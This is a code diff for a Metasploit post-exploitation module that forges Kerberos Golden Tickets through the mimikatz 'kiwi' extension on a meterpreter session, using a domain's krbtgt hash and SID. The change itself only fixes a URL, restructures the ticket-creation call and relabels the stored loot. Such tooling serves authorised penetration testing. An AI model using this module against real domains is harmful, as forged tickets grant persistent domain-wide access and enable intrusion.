@@ -27,7 +27,7 @@ class MetasploitModule < Msf::Post
       'SessionTypes' => [ 'meterpreter' ],
       'References'   =>
             [
-              ['URL', 'https:/github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos']
+              ['URL', 'https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos']
             ]
     ))
 
@@ -51,9 +51,6 @@ class MetasploitModule < Msf::Post
     krbtgt_hash = datastore['KRBTGT_HASH']
     domain_sid = datastore['SID']
     id = datastore['ID'] || 0
-
-    groups = []
-    groups = datastore['GROUPS'].split(',').map(&:to_i) if datastore['GROUPS']
 
     unless domain
       print_status('Searching for the domain...')
@@ -103,12 +100,19 @@ class MetasploitModule < Msf::Post
     end
 
     print_status("Creating Golden Ticket for #{domain}\\#{user}...")
-    ticket = client.kiwi.golden_ticket_create(user, domain, domain_sid, krbtgt_hash, id, groups)
+    ticket = client.kiwi.golden_ticket_create({
+      user:        user,
+      domain_name: domain,
+      domain_sid:  domain_sid,
+      krbtgt_hash: krbtgt_hash,
+      id:          id,
+      group_ids:   datastore['GROUPS']
+    })
 
     if ticket
       print_good('Golden Ticket Obtained!')
       ticket_location = store_loot("golden.ticket",
-                                   "binary/kirbi",
+                                   "base64/kirbi",
                                    session,
                                    ticket,
                                    "#{domain}\\#{user}-golden_ticket.kirbi",
